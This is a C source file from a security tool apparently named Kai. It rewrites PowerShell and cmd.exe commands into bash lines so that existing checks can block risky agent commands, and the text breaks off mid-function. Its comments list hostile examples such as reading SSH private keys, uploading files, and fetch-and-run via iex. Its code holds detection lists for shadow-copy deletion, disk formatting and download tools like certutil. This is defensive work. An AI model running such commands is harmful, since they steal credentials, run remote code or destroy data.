/* SPDX-License-Identifier: GPL-3.0-only OR LicenseRef-Kai-Commercial
 *
 * Windows command lines (PowerShell and cmd.exe) for Kai's shell checks.
 *
 * The bash reader (shell.c) treats '\' as an escape, so `type C:\Users\a\.env`
 * would reach the checks as `C:Usersa.env`, and it knows none of PowerShell's
 * names. Rather than a second copy of every check, this file reads a Windows
 * command and writes the same work as bash lines the existing checks already
 * understand:
 *
 *   Get-Content $env:USERPROFILE\.ssh\id_rsa    ->  cat 'C:/Users/a/.ssh/id_rsa'
 *   iwr https://x/in -Method Post -InFile n.txt ->  curl -d '@n.txt' 'https://x/in'
 *   iex (iwr https://x/s.ps1)                   ->  curl 'https://x/s.ps1' | sh
 *   powershell -enc <base64>                    ->  (the decoded script, read again)
 *   cmd /c type %USERPROFILE%\.ssh\id_rsa       ->  cat 'C:/Users/a/.ssh/id_rsa'
 *
 * Nothing is executed. Both readers run on every command (which shell an
 * agent uses isn't always known); any hit stops the command. What a value
 * computed at run time names ($d = '.ssh'; gc ~\$d\id_rsa) is not known here,
 * the same limit the bash reader has (docs/ESCAPES.md).
 *
 * It also recognizes destructive Windows commands (recursive forced delete,
 * format, diskpart, shadow-copy deletion, cipher /w): kai_winshell_destructive.
 */
#include "internal.h"
#include "platform.h"

#include <ctype.h>
#include <stdlib.h>
#include <string.h>

#define MAX_DEPTH 8
#define MAX_WORDS 256

typedef struct {
    char *w[MAX_WORDS];   /* cooked words */
    int raw_paren[MAX_WORDS];   /* the word was a ( ) / $( ) group */
    int n;
    int pipe;             /* this command pipes into the next */
} wcmd;

typedef struct {
    sb_t *out;            /* bash lines */
    int destructive;      /* kai_winshell_destructive */
    char what[160];
} wctx;

static void ps_parse(wctx *c, const char *text, int depth);
static void cmd_parse(wctx *c, const char *text, int depth);

static char *kai_strndup_s(const char *s, size_t n) {
    char *r = malloc(n + 1);
    if (!r) return NULL;
    memcpy(r, s, n);
    r[n] = 0;
    return r;
}

/* ------------------------------------------------------------- helpers */

static int ieq(const char *a, const char *b) { return a && b && !strcasecmp(a, b); }

/* "-rec" names parameter "recurse" if it is a prefix at least min long */
static int param_is(const char *w, const char *name, size_t min) {
    if (!w || w[0] != '-') return 0;
    const char *p = w + 1;
    size_t l = strcspn(p, ":");
    return l >= min && l <= strlen(name) && !strncasecmp(p, name, l);
}

/* cmd.exe switches: "/s", "/S/Q", "/q:on" */
static int cmd_switch(const char *w, char sw) {
    if (!w || w[0] != '/') return 0;
    for (const char *p = w; *p; p++)
        if (*p == '/' && tolower((unsigned char)p[1]) == tolower((unsigned char)sw) &&
            (p[2] == '\0' || p[2] == '/' || p[2] == ':'))
            return 1;
    return 0;
}

static int is_cmd_flag(const char *w) {
    if (!w || w[0] != '/' || !w[1]) return 0;
    size_t l = strcspn(w + 1, ":");
    if (l > 12) return 0;
    for (size_t i = 1; i <= l; i++)
        if (!(isalnum((unsigned char)w[i]) || w[i] == '?' || w[i] == '/' || w[i] == '-')) return 0;
    return 1;
}

/* The command name: no folder, no .exe/.com, lower case. */
static void cmd_name(const char *w, char *out, size_t n) {
    const char *b = w;
    for (const char *p = w; *p; p++) if (*p == '/' || *p == '\\') b = p + 1;
    kai_strlcpy(out, b, n);
    for (char *p = out; *p; p++) *p = (char)tolower((unsigned char)*p);
    size_t l = strlen(out);
    if (l > 4 && (!strcmp(out + l - 4, ".exe") || !strcmp(out + l - 4, ".com"))) out[l - 4] = '\0';
}

/* A word as a path the checks can read: environment expanded, '\' -> '/'. */
static char *cook(const char *w) {
    char *e = kai_plat_expand_env(w);
    char *s = strdup(e ? e : w);
    free(e);
    if (!s) return NULL;
    for (char *p = s; *p; p++) if (*p == '\\') *p = '/';
    return s;
}

static void emit_word(sb_t *o, const char *w) {
    sb_adds(o, " '");
    for (const char *p = w; *p; p++) {
        if (*p == '\'') sb_adds(o, "'\\''");
        else if (*p == '\n' || *p == '\r') sb_adds(o, " ");
        else sb_add(o, p, 1);
    }
    sb_adds(o, "'");
}

/* A new bash line. The name is written bare, so only name characters pass:
 * a stray quote must not run on into the next line. */
static void line_start(wctx *c, const char *name) {
    if (c->out->len) sb_adds(c->out, "\n");
    size_t k = 0;
    for (const char *p = name; *p && k < 64; p++, k++)
        sb_add(c->out, (isalnum((unsigned char)*p) || strchr("._-", *p)) ? p : "x", 1);
    if (!k) sb_adds(c->out, "x");
}

static void mark_destructive(wctx *c, const char *what) {
    if (!c->destructive) kai_strlcpy(c->what, what, sizeof c->what);
    c->destructive = 1;
}

/* base64 -> bytes; NULL if it isn't base64 */
static unsigned char *b64_decode(const char *s, size_t *outlen) {
    size_t l = strlen(s);
    unsigned char *o = malloc(l / 4 * 3 + 4);
    if (!o) return NULL;
    unsigned v = 0;
    int bits = 0;
    size_t n = 0;
    for (const char *p = s; *p; p++) {
        int d;
        if (*p >= 'A' && *p <= 'Z') d = *p - 'A';
        else if (*p >= 'a' && *p <= 'z') d = *p - 'a' + 26;
        else if (*p >= '0' && *p <= '9') d = *p - '0' + 52;
        else if (*p == '+' || *p == '-') d = 62;
        else if (*p == '/' || *p == '_') d = 63;
        else if (*p == '=' || isspace((unsigned char)*p)) continue;
        else { free(o); return NULL; }
        v = (v << 6) | (unsigned)d;
        bits += 6;
        if (bits >= 8) { bits -= 8; o[n++] = (unsigned char)(v >> bits); }
    }
    *outlen = n;
    return o;
}

/* -EncodedCommand is UTF-16LE: to UTF-8 */
static char *utf16le_to_utf8(const unsigned char *b, size_t n) {
    sb_t s;
    sb_init(&s);
    for (size_t i = 0; i + 1 < n; i += 2) {
        unsigned cp = b[i] | (b[i + 1] << 8);
        if (cp >= 0xD800 && cp < 0xDC00 && i + 3 < n) {
            unsigned lo = b[i + 2] | (b[i + 3] << 8);
            if (lo >= 0xDC00 && lo < 0xE000) { cp = 0x10000 + ((cp - 0xD800) << 10) + (lo - 0xDC00); i += 2; }
        }
        char u[4];
        size_t k;
        if (cp < 0x80) { u[0] = (char)cp; k = 1; }
        else if (cp < 0x800) { u[0] = (char)(0xC0 | cp >> 6); u[1] = (char)(0x80 | (cp & 0x3F)); k = 2; }
        else if (cp < 0x10000) { u[0] = (char)(0xE0 | cp >> 12); u[1] = (char)(0x80 | ((cp >> 6) & 0x3F)); u[2] = (char)(0x80 | (cp & 0x3F)); k = 3; }
        else { u[0] = (char)(0xF0 | cp >> 18); u[1] = (char)(0x80 | ((cp >> 12) & 0x3F)); u[2] = (char)(0x80 | ((cp >> 6) & 0x3F)); u[3] = (char)(0x80 | (cp & 0x3F)); k = 4; }
        sb_add(&s, u, k);
    }
    return sb_take(&s);
}

/* ------------------------------------------------------------- mapping */

static const char *const READERS[] = {"get-content", "gc", "cat", "type", "more", "select-string", "sls",
                                      "findstr", "find", "format-hex", "fhx", "import-csv", "get-filehash", NULL};
static const char *const COPIERS[] = {"copy-item", "copy", "cp", "cpi", "xcopy", "robocopy", NULL};
static const char *const MOVERS[] = {"move-item", "move", "mv", "mi", "rename-item", "ren", "rni", NULL};
static const char *const REMOVERS[] = {"remove-item", "ri", "rm", "del", "erase", "rd", "rmdir", NULL};
static const char *const WRITERS[] = {"set-content", "sc", "add-content", "ac", "out-file", "new-item", "ni",
                                      "clear-content", "clc", "tee-object", "tee", NULL};
static const char *const FETCHERS[] = {"invoke-webrequest", "iwr", "invoke-restmethod", "irm", "wget", "curl", NULL};

static int in_list(const char *n, const char *const *list) {
    for (int i = 0; list[i]; i++) if (!strcmp(n, list[i])) return 1;
    return 0;
}

static int has_param(const wcmd *k, const char *name, size_t min) {
    for (int i = 1; i < k->n; i++) if (param_is(k->w[i], name, min)) return 1;
    return 0;
}

static int has_switch(const wcmd *k, char sw) {
    for (int i = 1; i < k->n; i++) if (cmd_switch(k->w[i], sw)) return 1;
    return 0;
}

/* The value of -Name (or -Name:value), else NULL */
static const char *param_value(const wcmd *k, const char *name, size_t min, int *idx) {
    for (int i = 1; i < k->n; i++) {
        if (!param_is(k->w[i], name, min)) continue;
        const char *colon = strchr(k->w[i], ':');
        if (colon && colon[1]) { if (idx) *idx = i; return colon + 1; }
        if (i + 1 < k->n) { if (idx) *idx = i + 1; return k->w[i + 1]; }
    }
    return NULL;
}

/* A file a ( ... ) group reads: "(Get-Content notes.txt -Raw)" -> notes.txt */
static char *group_reads(const char *g) {
    if (!g || g[0] != '(') return NULL;
    char name[64];
    const char *p = g + 1;
    while (*p == ' ' || *p == '$' || *p == '(') p++;
    size_t l = strcspn(p, " )");
    char first[128];
    if (l >= sizeof first) return NULL;
    memcpy(first, p, l);
    first[l] = '\0';
    cmd_name(first, name, sizeof name);
    if (!in_list(name, READERS)) return NULL;
    p += l;
    while (*p) {
        while (*p == ' ') p++;
        size_t m = strcspn(p, " )");
        if (!m) break;
        if (*p != '-') {
            char *f = malloc(m + 1);
            if (!f) return NULL;
            memcpy(f, p, m);
            f[m] = '\0';
            if ((f[0] == '\'' || f[0] == '"') && m > 1) { memmove(f, f + 1, m); f[strcspn(f, "'\"")] = '\0'; }
            char *c = cook(f);
            free(f);
            return c;
        }
        p += m;
    }
    return NULL;
}

static const char *first_url(const wcmd *k) {
    for (int i = 1; i < k->n; i++) if (strstr(k->w[i], "://")) return k->w[i];
    return NULL;
}

/* Download / upload commands as curl. pipe_shell: its output runs (iex). */
static int map_fetch(wctx *c, const wcmd *k, const char *name, int pipe_shell) {
    const char *url = NULL, *infile = NULL, *outfile = NULL;
    char *bodyfile = NULL;
    if (in_list(name, FETCHERS)) {
        url = param_value(k, "uri", 1, NULL);
        infile = param_value(k, "infile", 2, NULL);
        outfile = param_value(k, "outfile", 2, NULL);
        int bi = 0;
        if (param_value(k, "body", 1, &bi) && k->raw_paren[bi]) bodyfile = group_reads(k->w[bi]);
        /* curl.exe / wget's own flags pass through as they are */
        if (!strcmp(name, "curl") || !strcmp(name, "wget")) {
            line_start(c, name);
            for (int i = 1; i < k->n; i++) emit_word(c->out, k->w[i]);
            if (pipe_shell) sb_adds(c->out, " | sh");
        }
    } else if (!strcmp(name, "start-bitstransfer")) {
        const char *src = param_value(k, "source", 1, NULL), *dst = param_value(k, "destination", 1, NULL);
        const char *type = param_value(k, "transfertype", 1, NULL);
        if (type && ieq(type, "upload")) { infile = src; url = dst; }
        else { url = src; outfile = dst; }
    } else if (!strcmp(name, "bitsadmin")) {
        int up = 0;
        for (int i = 1; i < k->n; i++) {
            if (ieq(k->w[i], "/upload")) up = 1;
            if (strstr(k->w[i], "://")) {
                url = k->w[i];
                if (i + 1 < k->n) { if (up) infile = k->w[i + 1]; else outfile = k->w[i + 1]; }
            }
        }
    } else if (!strcmp(name, "certutil")) {
        int cache = 0;
        for (int i = 1; i < k->n; i++) if (ieq(k->w[i], "-urlcache") || ieq(k->w[i], "/urlcache")) cache = 1;
        if (!cache) return 0;
        for (int i = 1; i < k->n; i++)
            if (strstr(k->w[i], "://")) { url = k->w[i]; if (i + 1 < k->n) outfile = k->w[i + 1]; }
    } else return 0;
    if (!url) url = first_url(k);
    if (!url) {   /* positional -Uri */
        for (int i = 1; i < k->n; i++) if (k->w[i][0] != '-' && !k->raw_paren[i]) { url = k->w[i]; break; }
    }
    if (!url) { free(bodyfile); return 1; }
    line_start(c, "curl");
    if (infile) { sb_adds(c->out, " -d"); char a[1100]; snprintf(a, sizeof a, "@%s", infile); emit_word(c->out, a); }
    if (bodyfile) { sb_adds(c->out, " -d"); char a[1100]; snprintf(a, sizeof a, "@%s", bodyfile); emit_word(c->out, a); }
    if (outfile) { sb_adds(c->out, " -o"); emit_word(c->out, outfile); }
    emit_word(c->out, url);
    if (pipe_shell) sb_adds(c->out, " | sh");
    free(bodyfile);
    return 1;
}

static int is_fetch(const char *name) {
    return in_list(name, FETCHERS) || !strcmp(name, "start-bitstransfer") || !strcmp(name, "bitsadmin") ||
           !strcmp(name, "certutil");
}

/* One simple command. prev_fetch: the previous command in the pipeline
 * downloads (so "iwr x | iex" runs what it fetched). */
static void map_cmd(wctx *c, wcmd *k, int depth, int prev_fetch, const wcmd *prev) {
    if (!k->n) return;
    char name[64];
    cmd_name(k->w[0], name, sizeof name);

    /* ---- destructive (Windows) ---- */
    if (in_list(name, REMOVERS) && has_param(k, "recurse", 1) && has_param(k, "force", 2))
        mark_destructive(c, "Remove-Item -Recurse -Force");
    if ((!strcmp(name, "del") || !strcmp(name, "erase")) && has_switch(k, 's') && has_switch(k, 'q'))
        mark_destructive(c, "del /s /q");
    if ((!strcmp(name, "rd") || !strcmp(name, "rmdir")) && has_switch(k, 's')) mark_destructive(c, "rd /s");
    if (!strcmp(name, "format") && k->n > 1) {
        for (int i = 1; i < k->n; i++)
            if (isalpha((unsigned char)k->w[i][0]) && k->w[i][1] == ':' && !k->w[i][2]) mark_destructive(c, "format");
    }
    if (!strcmp(name, "diskpart")) mark_destructive(c, "diskpart");
    if (!strcmp(name, "format-volume") || !strcmp(name, "clear-disk") || !strcmp(name, "remove-partition") ||
        !strcmp(name, "initialize-disk"))
        mark_destructive(c, k->w[0]);
    if (!strcmp(name, "vssadmin") || !strcmp(name, "wmic") || !strcmp(name, "wbadmin")) {
        int del = 0, shadows = 0;
        for (int i = 1; i < k->n; i++) {
            if (ieq(k->w[i], "delete")) del = 1;
            if (strcasestr(k->w[i], "shadow") || ieq(k->w[i], "catalog") || strcasestr(k->w[i], "backup")) shadows = 1;
        }
        if (del && shadows) mark_destructive(c, "deleting shadow copies or backups");
    }
    if (!strcmp(name, "cipher") && has_switch(k, 'w')) mark_destructive(c, "cipher /w");

    /* ---- nested shells: read what they run ---- */
    if (!strcmp(name, "powershell") || !strcmp(name, "pwsh") || !strcmp(name, "powershell_ise")) {
        if (depth >= MAX_DEPTH) return;
        for (int i = 1; i < k->n; i++) {
            const char *a = k->w[i];
            if (a[0] == '-' || a[0] == '/') {
                char f[32];
                kai_strlcpy(f, a + 1, sizeof f);
                for (char *p = f; *p; p++) *p = (char)tolower((unsigned char)*p);
                size_t fl = strlen(f);
                if (!strcmp(f, "e") || !strcmp(f, "ec") || (fl >= 2 && !strncmp("encodedcommand", f, fl))) {
                    if (i + 1 < k->n) {
                        size_t bl = 0;
                        unsigned char *b = b64_decode(k->w[i + 1], &bl);
                        if (b) {
                            char *script = utf16le_to_utf8(b, bl);
                            free(b);
                            if (script) { ps_parse(c, script, depth + 1); free(script); }
                        }
                    }
                    return;
                }
                if (fl >= 1 && !strncmp("command", f, fl)) {
                    sb_t s; sb_init(&s);
                    for (int j = i + 1; j < k->n; j++) { if (s.len) sb_adds(&s, " "); sb_adds(&s, k->w[j]); }
                    char *script = sb_take(&s);
                    ps_parse(c, script, depth + 1);
                    free(script);
                    return;
                }
                if (fl >= 1 && !strncmp("file", f, fl)) {   /* runs a script: its path is checked */
                    line_start(c, "powershell");
                    for (int j = i + 1; j < k->n; j++) emit_word(c->out, k->w[j]);
                    return;
                }
                static const char *const withval[] = {"executionpolicy", "ex", "ep", "windowstyle", "version",
                                                      "inputformat", "outputformat", "configurationname",
                                                      "workingdirectory", "wd", "settingsfile", "psconsolefile", NULL};
                for (int v = 0; withval[v]; v++)
                    if (!strcmp(f, withval[v]) || (fl >= 3 && !strncmp(withval[v], f, fl))) { i++; break; }
                continue;
            }
            /* first non-option: the rest is the command */
            sb_t s; sb_init(&s);
            for (int j = i; j < k->n; j++) { if (s.len) sb_adds(&s, " "); sb_adds(&s, k->w[j]); }
            char *script = sb_take(&s);
            ps_parse(c, script, depth + 1);
            free(script);
            return;
        }
        return;
    }
    if (!strcmp(name, "cmd")) {
        if (depth >= MAX_DEPTH) return;
        for (int i = 1; i < k->n; i++) {
            if (cmd_switch(k->w[i], 'c') || cmd_switch(k->w[i], 'k') || cmd_switch(k->w[i], 'r')) {
                sb_t s; sb_init(&s);
                for (int j = i + 1; j < k->n; j++) { if (s.len) sb_adds(&s, " "); sb_adds(&s, k->w[j]); }
                char *script = sb_take(&s);
                cmd_parse(c, script, depth + 1);
                free(script);
                return;
            }
        }
        return;
    }
    if (!strcmp(name, "iex") || !strcmp(name, "invoke-expression")) {
        if (prev_fetch && prev) {   /* iwr URL | iex */
            char pn[64];
            cmd_name(prev->w[0], pn, sizeof pn);
            map_fetch(c, prev, pn, 1);
        }
        for (int i = 1; i < k->n && depth < MAX_DEPTH; i++) {
            if (k->w[i][0] == '-') continue;
            if (k->raw_paren[i]) {   /* iex (iwr URL): the group's download runs */
                const char *g = k->w[i] + 1;
                char inner[2048];
                kai_strlcpy(inner, g, sizeof inner);
                size_t l = strlen(inner);
                if (l && inner[l - 1] == ')') inner[l - 1] = '\0';
                char *dot = strstr(inner, ").");   /* (iwr x).Content */
                if (dot) *dot = '\0';
                wcmd t = {{0}, {0}, 0, 0};
                char *save = NULL;
                char *copy = strdup(inner);
                for (char *tok = copy ? strtok_r(copy, " \t", &save) : NULL; tok && t.n < MAX_WORDS;
                     tok = strtok_r(NULL, " \t", &save)) {
                    while (*tok == '(') tok++;
                    if (!*tok) continue;
                    size_t tl = strlen(tok);
                    if (tl > 1 && (tok[0] == '\'' || tok[0] == '"') && tok[tl - 1] == tok[0]) { tok[tl - 1] = '\0'; tok++; }
                    t.w[t.n++] = cook(tok);
                }
                if (t.n) {
                    char tn[64];
                    cmd_name(t.w[0], tn, sizeof tn);
                    if (is_fetch(tn)) map_fetch(c, &t, tn, 1);
                }
                for (int j = 0; j < t.n; j++) free(t.w[j]);
                free(copy);
            } else {
                ps_parse(c, k->w[i], depth + 1);   /* iex 'a string' */
            }
        }
        return;
    }
    if (!strcmp(name, "start-process") || !strcmp(name, "saps") || !strcmp(name, "start")) {
        const char *file = param_value(k, "filepath", 1, NULL);
        int fi = 0;
        if (!file) for (int i = 1; i < k->n; i++) if (k->w[i][0] != '-' && !is_cmd_flag(k->w[i])) { file = k->w[i]; fi = i; break; }
        if (!file || depth >= MAX_DEPTH) return;
        wcmd t = {{0}, {0}, 0, 0};
        t.w[t.n++] = strdup(file);
        const char *args = param_value(k, "argumentlist", 1, NULL);
        if (args) {
            char *copy = strdup(args), *save = NULL;
            for (char *tok = copy ? strtok_r(copy, " ,\t", &save) : NULL; tok && t.n < MAX_WORDS;
                 tok = strtok_r(NULL, " ,\t", &save)) {
                size_t tl = strlen(tok);
                if (tl > 1 && (tok[0] == '\'' || tok[0] == '"') && tok[tl - 1] == tok[0]) { tok[tl - 1] = '\0'; tok++; }
                t.w[t.n++] = strdup(tok);
            }
            free(copy);
        } else {
            for (int i = fi + 1; fi && i < k->n && t.n < MAX_WORDS; i++) t.w[t.n++] = strdup(k->w[i]);
        }
        map_cmd(c, &t, depth + 1, 0, NULL);
        for (int j = 0; j < t.n; j++) free(t.w[j]);
        return;
    }
    if (is_fetch(name)) {
        if (k->pipe) return;   /* its pipe target decides (iex: runs it) */
        if (map_fetch(c, k, name, 0)) return;
    }
    if (k->pipe == 0 && prev_fetch && prev && strcmp(name, "out-null")) {   /* iwr x | <cmd> */
        char pn[64];
        cmd_name(prev->w[0], pn, sizeof pn);
        map_fetch(c, prev, pn, 0);
    }

    /* ---- the rest: as the POSIX command doing the same ---- */
    const char *as = NULL;
    int recursive = has_param(k, "recurse", 1) || has_switch(k, 's') || has_switch(k, 'e') || has_switch(k, 'mir');
    if (in_list(name, READERS)) as = "cat";
    else if (in_list(name, COPIERS)) as = "cp";
    else if (in_list(name, MOVERS)) as = "mv";
    else if (in_list(name, REMOVERS)) as = "rm";
    else if (in_list(name, WRITERS)) as = "tee";
    else if (!strcmp(name, "compress-archive")) { as = "zip"; recursive = 1; }
    else if (!strcmp(name, "get-childitem") || !strcmp(name, "gci") || !strcmp(name, "dir") || !strcmp(name, "ls"))
        as = "ls";
    else if (!strcmp(name, "certutil")) as = "cp";   /* -encode/-decode in out: reads in, writes out */
    int native_flags = !strcmp(name, "del") || !strcmp(name, "erase") || !strcmp(name, "rd") ||
                       !strcmp(name, "rmdir") || !strcmp(name, "copy") || !strcmp(name, "xcopy") ||
                       !strcmp(name, "robocopy") || !strcmp(name, "move") || !strcmp(name, "ren") ||
                       !strcmp(name, "type") || !strcmp(name, "more") || !strcmp(name, "findstr") ||
                       !strcmp(name, "find") || !strcmp(name, "dir") || !strcmp(name, "cipher") ||
                       !strcmp(name, "certutil") || !strcmp(name, "format");
    if (!as) {   /* unknown: kept as is, every word still checked as a path */
        line_start(c, name[0] ? name : "x");
        for (int i = 1; i < k->n; i++) {
            if (!strcmp(k->w[i], ">") || !strcmp(k->w[i], "<")) { sb_adds(c->out, " "); sb_adds(c->out, k->w[i]); continue; }
            emit_word(c->out, k->w[i]);
        }
        if (k->pipe) sb_adds(c->out, " |");
        return;
    }
    line_start(c, as);
    if (recursive && (!strcmp(as, "cp") || !strcmp(as, "rm") || !strcmp(as, "zip"))) sb_adds(c->out, " -r");
    for (int i = 1; i < k->n; i++) {
        const char *a = k->w[i];
        if (!strcmp(a, ">") || !strcmp(a, "<")) { sb_adds(c->out, " "); sb_adds(c->out, a); continue; }
        if (a[0] == '-' && isalpha((unsigned char)a[1])) {   /* a PowerShell parameter: keep -Name:value's value */
            const char *colon = strchr(a, ':');
            if (colon && colon[1] && colon[1] != '$') emit_word(c->out, colon + 1);
            continue;
        }
        if (native_flags && is_cmd_flag(a)) continue;
        emit_word(c->out, a);
    }
    if (k->pipe) sb_adds(c->out, " |");
}

/* Run a parsed pipeline list through map_cmd. */
static void map_all(wctx *c, wcmd *cmds, int n, int depth) {
    for (int i = 0; i < n; i++) {
        const wcmd *prev = i > 0 && cmds[i - 1].pipe ? &cmds[i - 1] : NULL;
        int prev_fetch = 0;
        if (prev && prev->n) {
            char pn[64];
            cmd_name(prev->w[0], pn, sizeof pn);
            prev_fetch = is_fetch(pn);
        }
        map_cmd(c, &cmds[i], depth, prev_fetch, prev);
    }
}

static void free_cmds(wcmd *cmds, int n) {
    for (int i = 0; i < n; i++)
        for (int j = 0; j < cmds[i].n; j++) free(cmds[i].w[j]);
    free(cmds);
}

/* ---------------------------------------------------------- PowerShell */

typedef struct {
    wcmd *cmds;
    int n, cap;
    sb_t word;
    int have_word, paren_word;
} builder;

static wcmd *cur(builder *b) {
    if (!b->n) {
        if (b->cap == 0) { b->cap = 8; b->cmds = calloc((size_t)b->cap, sizeof *b->cmds); }
        if (!b->cmds) return NULL;
        b->n = 1;
    }
    return &b->cmds[b->n - 1];
}

static void end_word(builder *b) {
    if (!b->have_word) return;
    wcmd *k = cur(b);
    char *raw = sb_take(&b->word);
    if (k && k->n < MAX_WORDS) {
        k->raw_paren[k->n] = b->paren_word;
        k->w[k->n++] = b->paren_word ? raw : cook(raw);
        if (!b->paren_word) free(raw);
    } else free(raw);
    b->have_word = 0;
    b->paren_word = 0;
}

static void push_op(builder *b, const char *op) {
    end_word(b);
    wcmd *k = cur(b);
    if (k && k->n < MAX_WORDS) { k->raw_paren[k->n] = 0; k->w[k->n++] = strdup(op); }
}

static void end_cmd(builder *b, int pipe) {
    end_word(b);
    wcmd *k = cur(b);
    if (!k || !k->n) return;
    k->pipe = pipe;
    if (b->n == b->cap) {
        wcmd *nc = realloc(b->cmds, (size_t)b->cap * 2 * sizeof *nc);
        if (!nc) return;
        memset(nc + b->cap, 0, (size_t)b->cap * sizeof *nc);
        b->cmds = nc;
        b->cap *= 2;
    }
    b->n++;
}

/* index just past the bracket matching s[i] ('(' or '{'), quotes respected */
static size_t match_close(const char *s, size_t i) {
    char open = s[i], close = open == '(' ? ')' : '}';
    int d = 0;
    for (size_t j = i; s[j]; j++) {
        if (s[j] == '\'') { j++; while (s[j] && s[j] != '\'') j++; if (!s[j]) return j; continue; }
        if (s[j] == '"') { j++; while (s[j] && s[j] != '"') { if (s[j] == '`' && s[j + 1]) j++; j++; } if (!s[j]) return j; continue; }
        if (s[j] == '`' && s[j + 1]) { j++; continue; }
        if (s[j] == open) d++;
        else if (s[j] == close && --d == 0) return j + 1;
    }
    return strlen(s);
}

static void ps_parse(wctx *c, const char *s, int depth) {
    if (!s || depth > MAX_DEPTH) return;
    builder b;
    memset(&b, 0, sizeof b);
    sb_init(&b.word);
    for (size_t i = 0; s[i];) {
        char ch = s[i];
        if (ch == ' ' || ch == '\t' || ch == '\r') { end_word(&b); i++; continue; }
        if (ch == '\n' || ch == ';') { end_cmd(&b, 0); i++; continue; }
        if (ch == '|') { end_cmd(&b, s[i + 1] != '|'); i += s[i + 1] == '|' ? 2 : 1; continue; }
        if (ch == '&') {
            if (s[i + 1] == '&') { end_cmd(&b, 0); i += 2; continue; }
            wcmd *k = cur(&b);
            if (!b.have_word && k && !k->n) { i++; continue; }   /* call operator */
            end_cmd(&b, 0); i++; continue;
        }
        if (ch == '#' && !b.have_word) { while (s[i] && s[i] != '\n') i++; continue; }
        if (ch == '>' || (ch == '2' && s[i + 1] == '>' && !b.have_word)) {
            if (ch == '2') i++;
            i++;
            if (s[i] == '>') i++;
            if (s[i] == '&') { i++; while (isdigit((unsigned char)s[i])) i++; continue; }   /* 2>&1 */
            push_op(&b, ">");
            continue;
        }
        if (ch == '<' && !b.have_word) { push_op(&b, "<"); i++; continue; }
        if (ch == '`') {
            if (s[i + 1] == '\n') { i += 2; continue; }
            if (s[i + 1]) { sb_add(&b.word, s + i + 1, 1); b.have_word = 1; i += 2; continue; }
            i++; continue;
        }
        if (ch == '@' && (s[i + 1] == '\'' || s[i + 1] == '"') && (s[i + 2] == '\n' || s[i + 2] == '\r')) {
            char q = s[i + 1];
            size_t j = i + 2;
            while (s[j] == '\r' || s[j] == '\n') j++;
            size_t st = j;
            while (s[j] && !((s[j] == '\n') && s[j + 1] == q && s[j + 2] == '@')) j++;
            sb_add(&b.word, s + st, j - st);
            b.have_word = 1;
            i = s[j] ? j + 3 : j;
            continue;
        }
        if (ch == '\'') {
            size_t j = i + 1;
            while (s[j]) {
                if (s[j] == '\'' && s[j + 1] == '\'') { sb_add(&b.word, "'", 1); j += 2; continue; }
                if (s[j] == '\'') break;
                sb_add(&b.word, s + j, 1);
                j++;
            }
            b.have_word = 1;
            i = s[j] ? j + 1 : j;
            continue;
        }
        if (ch == '"') {
            size_t j = i + 1;
            while (s[j]) {
                if (s[j] == '`' && s[j + 1]) { sb_add(&b.word, s + j + 1, 1); j += 2; continue; }
                if (s[j] == '"' && s[j + 1] == '"') { sb_add(&b.word, "\"", 1); j += 2; continue; }
                if (s[j] == '"') break;
                if (s[j] == '$' && s[j + 1] == '(') {   /* subexpression: read it, keep its text */
                    size_t e = match_close(s, j + 1);
                    char *inner = kai_strndup_s(s + j + 2, e > j + 3 ? e - j - 3 : 0);
                    if (inner) { ps_parse(c, inner, depth + 1); free(inner); }
                    sb_add(&b.word, s + j, e - j);
                    j = e;
                    continue;
                }
                sb_add(&b.word, s + j, 1);
                j++;
            }
            b.have_word = 1;
            i = s[j] ? j + 1 : j;
            continue;
        }
        if (ch == '(' || (ch == '$' && s[i + 1] == '(') || ch == '{' || (ch == '@' && s[i + 1] == '(')) {
            size_t open = (ch == '$' || ch == '@') ? i + 1 : i;
            size_t e = match_close(s, open);
            size_t inner_len = e > open + 2 ? e - open - 2 : 0;
            char *inner = kai_strndup_s(s + open + 1, inner_len);
            if (inner) { ps_parse(c, inner, depth + 1); free(inner); }
            if (s[open] == '(' && !b.have_word) b.paren_word = 1;
            sb_add(&b.word, s + open, e - open);
            b.have_word = 1;
            i = e;
            continue;
        }
        sb_add(&b.word, s + i, 1);
        b.have_word = 1;
        i++;
    }
    end_cmd(&b, 0);
    sb_free(&b.word);
    if (b.cmds) {
        int n = b.n;
        if (n && !b.cmds[n - 1].n) n--;
        map_all(c, b.cmds, n, depth);
        free_cmds(b.cmds, b.n);
    }
}

/* ------------------------------------------------------------ cmd.exe */

static void cmd_parse(wctx *c, const char *text, int depth) {
    if (!text || depth > MAX_DEPTH) return;
    char *exp = kai_plat_expand_env(text);   /* cmd expands %VAR% before it parses */
    const char *s = exp ? exp : text;
    builder b;
    memset(&b, 0, sizeof b);
    sb_init(&b.word);
    int q = 0;
    for (size_t i = 0; s[i]; i++) {
        char ch = s[i];
        if (q) {
            if (ch == '"') q = 0;
            else sb_add(&b.word, s + i, 1);
            continue;
        }
        if (ch == '"') { q = 1; b.have_word = 1; continue; }
        if (ch == '^') {
            if (s[i + 1] == '\n') { i++; continue; }
            if (s[i + 1]) { sb_add(&b.word, s + i + 1, 1); b.have_word = 1; i++; }
            continue;
        }
        if (ch == ' ' || ch == '\t' || ch == '\r' || ch == ',' || ch == ';') { end_word(&b); continue; }
        if (ch == '\n' || ch == '(' || ch == ')') { end_cmd(&b, 0); continue; }
        if (ch == '&') { end_cmd(&b, 0); if (s[i + 1] == '&') i++; continue; }
        if (ch == '|') { if (s[i + 1] == '|') { end_cmd(&b, 0); i++; } else end_cmd(&b, 1); continue; }
        if (ch == '>' ) { if (s[i + 1] == '>') i++; if (s[i + 1] == '&') { i += 2; continue; } push_op(&b, ">"); continue; }
        if (ch == '<') { push_op(&b, "<"); continue; }
        if (ch == '@' && !b.have_word) { wcmd *k = cur(&b); if (k && !k->n) continue; }
        sb_add(&b.word, s + i, 1);
        b.have_word = 1;
    }
    end_cmd(&b, 0);
    sb_free(&b.word);
    if (b.cmds) {
        int n = b.n;
        if (n && !b.cmds[n - 1].n) n--;
        map_all(c, b.cmds, n, depth);
        free_cmds(b.cmds, b.n);
    }
    free(exp);
}

/* ------------------------------------------------------------- public */

/* .NET calls PowerShell scripts make: (New-Object Net.WebClient).DownloadString('u') */
static void dotnet_calls(wctx *c, const char *s) {
    static const struct { const char *m; int up; } M[] = {
        {".downloadstring(", 0}, {".downloadfile(", 0}, {".downloaddata(", 0},
        {".uploadfile(", 1}, {".uploadstring(", 1}, {".uploaddata(", 1}, {".uploadvalues(", 1},
    };
    for (size_t k = 0; k < sizeof M / sizeof M[0]; k++) {
